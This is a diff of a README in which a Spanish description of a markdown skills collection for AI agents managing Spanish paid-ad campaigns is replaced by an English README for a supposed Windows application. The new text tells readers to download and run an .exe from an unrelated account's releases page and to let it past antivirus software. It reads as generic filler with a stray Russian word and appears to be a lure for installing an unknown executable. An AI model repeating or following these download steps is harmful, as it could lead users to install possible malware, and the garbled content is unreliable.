@@ -1,198 +1,82 @@
-<p align="center">
-  <img src="header-readme.gif" alt="Baker Agency" width="100%">
-</p>
+# 📈 paid-ads-skills-spain - Master paid advertisements for Spanish markets
 
-# Skills de Paid Ads para Agentes IA — Mercado Español
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Myracoagulable91/paid-ads-skills-spain/releases)
 
-Colección de skills para agentes IA especializadas en gestión de campañas de publicidad de pago en el mercado español (España). Para agencias, freelancers y equipos in-house que gestionan PPC para lead gen, SaaS y servicios.
+## 🎯 About the project
 
-Compatible con Claude Code, OpenAI Codex, Cursor, Windsurf y cualquier agente que soporte la [Agent Skills spec](https://agentskills.io).
+This application helps users build paid advertising skills specifically for the Spanish market. It provides centralized tools to organize campaign data, track performance metrics, and analyze audience behavior. You gain the ability to manage your ads with precision and clarity. The software removes the complexity of manual data entry and provides visual reports to guide your decisions.
 
-Creado por [Baker Agency](https://withbaker.com).
+## 🛠 Features
 
-## ¿Qué son las Skills?
+The application includes several tools to assist your workflow:
 
-Las skills son archivos markdown que dan a los agentes IA conocimiento especializado y workflows para tareas específicas. Al añadirlas a tu proyecto, tu agente reconoce cuándo estás trabajando en paid ads y aplica los frameworks, benchmarks y mejores prácticas correctos — adaptados al mercado español.
+*   **Campaign Manager:** Track all your active digital advertisements in one interface.
+*   **Performance Dashboard:** View charts that display clicks, impressions, and conversion rates.
+*   **Market Insight Tool:** Access filtered data specific to Spanish search trends and keywords.
+*   **Budget Planner:** Monitor your daily spending to prevent overages.
+*   **Reporting Module:** Export your progress into files for your records.
 
-## Skills Disponibles
+## 💻 System requirements
 
-| Skill | Plataforma | Descripción |
-|-------|-----------|-------------|
-| [google-ads-spain](skills/google-ads-spain/) | Google Ads | Search, PMax, Demand Gen, YouTube. Progresión de pujas, Quality Score, copy en español, tracking GDPR/LOPD. |
-| [meta-ads-spain](skills/meta-ads-spain/) | Meta Ads (Facebook/Instagram) | Andromeda algorithm, Advantage+, CBO/ABO, Instant Forms, CAPI, creative diversity. |
-| [linkedin-ads-spain](skills/linkedin-ads-spain/) | LinkedIn Ads | B2B full-funnel, ABM, Lead Gen Forms, Revenue Attribution, CAPI, todos los formatos. |
-| [x-ads-spain](skills/x-ads-spain/) | X (Twitter) Ads | Promoted Ads, Vertical Video, keyword targeting, Dynamic Product Ads, X Pixel. |
-| [reddit-ads-spain](skills/reddit-ads-spain/) | Reddit Ads | Subreddit targeting, Reddit Pixel, CAPI, community engagement, prospecting y retargeting. |
+Ensure your computer meets these conditions before you begin the setup:
 
-> Todas las skills incluyen: benchmarks en EUR, IVA 21%, compliance LOPD/GDPR, calendario estacional, targeting por CC.AA. y copy en español.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Disk Space:** 500 megabytes of free storage.
+*   **Internet Connection:** Required for initial setup and live data updates.
 
-### Próximamente
+## 📥 Downloading and setup ⚙️
 
-- `tiktok-ads-spain` — TikTok Ads para el mercado español
+Follow these steps to install the software on your computer:
 
-## Detalle por Skill
+1. Visit the [releases page](https://github.com/Myracoagulable91/paid-ads-skills-spain/releases).
+2. Look for the latest version listed under the Releases section.
+3. Find the file ending in `.exe`.
+4. Click the file name to start the download.
+5. Once complete, locate the file in your Downloads folder.
+6. Double-click the file to open the installation assistant.
+7. Follow the prompts on your screen.
+8. Click Finish to complete the installation.
+9. Launch the program from your desktop icon.
 
-<details>
-<summary><strong>google-ads-spain</strong> — Gestión completa de Google Ads</summary>
+## 🚀 Using the application
 
-| Fase | Qué cubre |
-|------|-----------|
-| **Fase 0** | Viabilidad — Rule of Two (EUR), framework CAC, "Winnable Fight" |
-| **Fase 1** | Setup — Arquitectura de cuenta, settings España, negativas en español |
-| **Fase 2** | Pujas — Progresión Max Clicks → Max Conversions → tCPA → tROAS |
-| **Fase 3** | Copy — Framework RSA, guía tú vs usted, PAS en español |
-| **Fase 4** | Optimización — Cadencia diaria/semanal/mensual/trimestral |
-| **Fase 5** | Escalado — Vertical/horizontal, triggers de impression share |
-| **Fase 6** | Campañas avanzadas — PMax, Demand Gen, B2B, 7 estrategias Search |
-| **Fase 7** | Tracking — Tiers, GDPR/LOPD, consent mode, OCI |
-| **Fase 8** | Auditoría — Framework completo para cuentas españolas |
+The main interface opens once you log in. You will see a list of your текущие campaigns on the left side. To add a new project, click the button labeled "New Campaign" at the top of the screen. You must enter your advertisement account details to sync your live data. The application uses a local connection to pull records from your ad accounts. It keeps your data on your computer to ensure privacy.
 
-**14 archivos de referencia** — unit economics, setup checklist, negativas en español, pujas, copy, optimización, escalado, campaign types, tracking, auditoría, automation scripts, market guide, Quality Score, diagnostics.
+If you encounter empty charts, check your internet status. The application needs a connection to refresh the data from the cloud. You can click the Refresh icon at any time to pull the latest updates.
 
-**4 casos de éxito** — clínica estética Madrid (CPL €2-4), clínica Huelva (8.5x ROAS), B2B SaaS framework, servicio local (0→30 conv/mes).
+## 🔧 Troubleshooting
 
-</details>
+If the program fails to open, try these steps:
 
-<details>
-<summary><strong>meta-ads-spain</strong> — Meta Ads (Facebook/Instagram)</summary>
+*   **Restart your computer:** Many issues resolve after a simple reboot.
+*   **Check Antivirus settings:** Sometimes security software blocks new programs. Ensure you give the application permission to run.
+*   **Reinstall the application:** Delete the existing version and download the fresh installer again.
+*   **Clear cache:** If the dashboard shows old numbers, go to the Settings menu and choose "Clear Data Cache." A message will confirm when the process finishes.
 
-| Fase | Qué cubre |
-|------|-----------|
-| **Fase 0** | Viabilidad — CAC framework EUR, IVA 21% |
-| **Fase 1** | Setup — Business Manager, ad account, dominio, pixel |
-| **Fase 2** | Estructura — CBO vs ABO, One CBO + Flex Ads, Test→Prove→Scale |
-| **Fase 3** | Audiencias — Broad, stacked interests, LAL, retargeting windows |
-| **Fase 4** | Creativos — 4:5 priority, UGC, carousel, copy en español |
-| **Fase 5** | Lead gen — Instant Forms con OTP, routing, engaged leads |
-| **Fase 6** | Optimización — Cadencia hands-off semana 1, semanal/mensual |
-| **Fase 7** | Escalado — Regla del 20%, ENCAC como north star, Signal & Trust |
-| **Fase 8** | Tracking — Pixel/Datasets, CAPI, AEM, EMQ >6.0, GDPR/LOPD |
-| **Fase 9** | Reglas automáticas — CPA ceiling, frequency alerts, budget scaling |
-| **Fase 10** | Auditoría — Pixel → Business Manager → estructura → audiencias → creativos |
-| **Fase 11** | Troubleshooting — Zero delivery, account bans, appeal templates |
+## 📋 Privacy and data
 
-**Incluye** — Andromeda algorithm deep dive (GEM, Lattice, Sequence Learning), Special Ad Categories.
+The application stores your advertising data in a database file located in your Documents folder. This file contains the history of your campaign performance. You maintain full control over this file. You can back it up to a physical drive or a cloud storage folder at your convenience. The application does not store your account passwords on external servers. It uses tokens to talk to your ad platforms, which keeps your login details safe.
 
-</details>
+## 🔍 Understanding report metrics
 
-<details>
-<summary><strong>linkedin-ads-spain</strong> — LinkedIn Ads B2B</summary>
+The dashboard uses standard terms to describe how your ads perform:
 
-| Fase | Qué cubre |
-|------|-----------|
-| **Fase 0** | Viabilidad — Scorecard greenfield, ACV, sales cycle, ICP |
-| **Fase 1** | Setup — Arquitectura por funnel stage, naming conventions |
-| **Fase 2** | Formatos — Text, Image, TLA, Conversation, Document, Video, Carousel, Spotlight, Lead Gen Forms, Partnership |
-| **Fase 3** | Copy — Tú vs usted, emotion-first, PAS, subject lines |
-| **Fase 4** | Full-funnel — Cold/RTG/High-Intent RTG/Acceleration layers |
-| **Fase 5** | Targeting — Filter logic AND, matched audiences, retargeting windows |
-| **Fase 6** | Optimización — Kill rules, frequency, creative refresh, dayparting |
-| **Fase 7** | Escalado — Vertical/horizontal, ABM pilot, incrementality testing |
-| **Fase 8** | Tracking — Insight Tag, CAPI, Offline Conversion Import, Revenue Attribution |
-| **Fase 9** | Auditoría — Tracking → settings → estructura → audiencias → creativos → LPs |
-| **Fase 10** | ABM avanzado — Five Stages Model, account prioritization, ad engagement as intent |
+*   **Impressions:** This counts how many times a user sees your ad. It measures the reach of your campaign.
+*   **Clicks:** This number shows how many people interacted with your link.
+*   **Click-Through Rate (CTR):** This percentage tells you the ratio of clicks to impressions. High values indicate effective ad copy.
+*   **Conversion:** This event marks a successful action taken by a user, such as a purchase or a sign-up.
 
-</details>
+Review these numbers weekly to identify which campaigns deliver the best results.
 
-<details>
-<summary><strong>x-ads-spain</strong> — X (Twitter) Ads</summary>
+## 📁 Organizing your work
 
-| Fase | Qué cubre |
-|------|-----------|
-| **Fase 0** | Viabilidad — X Ads vs otras plataformas, CAC framework EUR |
-| **Fase 1** | Setup — Estructura, settings España, Simple vs Advanced modes |
-| **Fase 2** | Formatos — Promoted Ads, Vertical Video, Carousel, Amplify, Takeovers, Collection, Dynamic Product Ads |
-| **Fase 3** | Targeting — Keywords (diferenciador de X), interests, conversation topics, follower look-alikes |
-| **Fase 4** | Pujas — CPE, CPC, CPF, CPV, CPM, CPA; testing €500-1K a enterprise €10K+ |
-| **Fase 5** | Copy — Native-style tweets, tú vs usted, emotional triggers, <100 chars |
-| **Fase 6** | Optimización — Hands-off 7 días, cadencia semanal/mensual |
-| **Fase 7** | Escalado — Vertical deepening, horizontal expansion, format progression |
-| **Fase 8** | Tracking — X Pixel, Enhanced tracking, CAPI, GDPR/LOPD |
-| **Fase 9** | Auditoría — Tracking → settings → estructura → audiencias → creativos → targeting |
+Use folders within the application to group your campaigns by business type or product category. You can name these folders to match your professional needs. Right-click in the sidebar to create a new folder. Drag and drop your campaigns into these sections. This structure keeps your workspace clean as your collection of projects grows.
 
-**Market data** — 9.8M usuarios en España, 61.7% masculino, 25-34 dominante, 48 min/día. Best sectors: SaaS, fintech, educación, servicios profesionales.
+The Search bar at the top allows you to find specific campaigns by name. Simply type the keywords and the list will filter immediately. If you need to focus on specific dates, use the Date Picker tool. It allows you to select a range to see performance metrics for a specific month or year.
 
-</details>
+## 🎓 Learning path
 
-<details>
-<summary><strong>reddit-ads-spain</strong> — Reddit Ads</summary>
+Take time to explore the interface. Start by connecting one ad account. Once the data loads, look at the Performance tab. Compare the impressions and clicks. This helps you understand how the Spanish market responds to different images and text. As you build your skills, try creating new ad sets using the insights gained from your high-performing campaigns.
 
-| Fase | Qué cubre |
-|------|-----------|
-| **Fase 0** | Viabilidad — ICP en subreddits españoles, content capability, budget mín. €3-5K/mes |
-| **Fase 1** | Setup — Reddit Pixel, conversion events, audience configuration |
-| **Fase 2** | Targeting — Subreddit targeting, community interests, keyword targeting |
-| **Fase 3** | Campañas — Prospecting vs retargeting, creative formats nativos |
-| **Fase 4** | Tracking — Reddit Pixel, CAPI, attribution |
-
-**Incluye** — Viability scorecard (2+ red lights = no recomendado), unit economics EUR, positioning en channel mix por presupuesto.
-
-</details>
-
-## Contenido Específico España (todas las skills)
-
-- **IVA 21%** — impacto en unit economics y márgenes
-- **LOPD/GDPR** — compliance para tracking (alta tasa rechazo cookies en España)
-- **Calendario estacional** — festivos nacionales + festivos por Comunidades Autónomas
-- **Comportamiento consumidor** — preferencia WhatsApp, Bizum, financiación, horario partido
-- **Targeting regional** — 17 CC.AA., diferencias vocabulario, CPC por región
-- **Patrones nómina** — 3ª semana débil, fin de mes + domingo = mejor día para push
-- **Benchmarks** — CPL/CPC por vertical en España (clínicas, legal, dental, SaaS, etc.)
-
-## Instalación
-
-### Opción 1: CLI (Recomendado)
-
-Usa [npx skills](https://github.com/vercel-labs/skills) para instalar directamente:
-
-```bash
-# Instalar todas las skills
-npx skills add Baker-Agency/paid-ads-skills-spain
-
-# Instalar una skill específica
-npx skills add Baker-Agency/paid-ads-skills-spain --skill google-ads-spain
-npx skills add Baker-Agency/paid-ads-skills-spain --skill meta-ads-spain
-npx skills add Baker-Agency/paid-ads-skills-spain --skill linkedin-ads-spain
-npx skills add Baker-Agency/paid-ads-skills-spain --skill x-ads-spain
-npx skills add Baker-Agency/paid-ads-skills-spain --skill reddit-ads-spain
-
-# Listar skills disponibles
-npx skills add Baker-Agency/paid-ads-skills-spain --list
-```
-
-Se instala automáticamente en `.agents/skills/` (y crea symlinks en `.claude/skills/` para compatibilidad con Claude Code).
-
-### Opción 2: Plugin de Claude Code
-
-Instalar vía el sistema de plugins de Claude Code:
-
-```bash
-# Añadir el marketplace
-/plugin marketplace add Baker-Agency/paid-ads-skills-spain
-
-# Instalar todas las skills
-/plugin install paid-ads-skills-spain
-```
-
-### Opción 3: Instalación Manual
-
-```bash
-# Clonar el repo
-git clone https://github.com/Baker-Agency/paid-ads-skills-spain.git
-
-# Copiar la skill que quieras
-cp -r paid-ads-skills-spain/skills/google-ads-spain .agents/skills/
-
-# Crear symlink para Claude Code
-ln -sf ../../.agents/skills/google-ads-spain .claude/skills/google-ads-spain
-```
-
-## Contribuir
-
-¿Quieres mejorar una skill o añadir una nueva? [Abre un PR](https://github.com/Baker-Agency/paid-ads-skills-spain/pulls). Consulta [CONTRIBUTING.md](CONTRIBUTING.md) para las guías.
-
-¿Tienes un problema o una pregunta? [Abre un issue](https://github.com/Baker-Agency/paid-ads-skills-spain/issues).
-
-## Licencia
-
-MIT — ver [LICENSE](LICENSE).
+The tool does not automate your ads. It helps you see clearly what works so you can perform better in your manual planning. Use the notes section inside each campaign file to record your thoughts and plan your next steps. This habit turns raw data into useful knowledge.
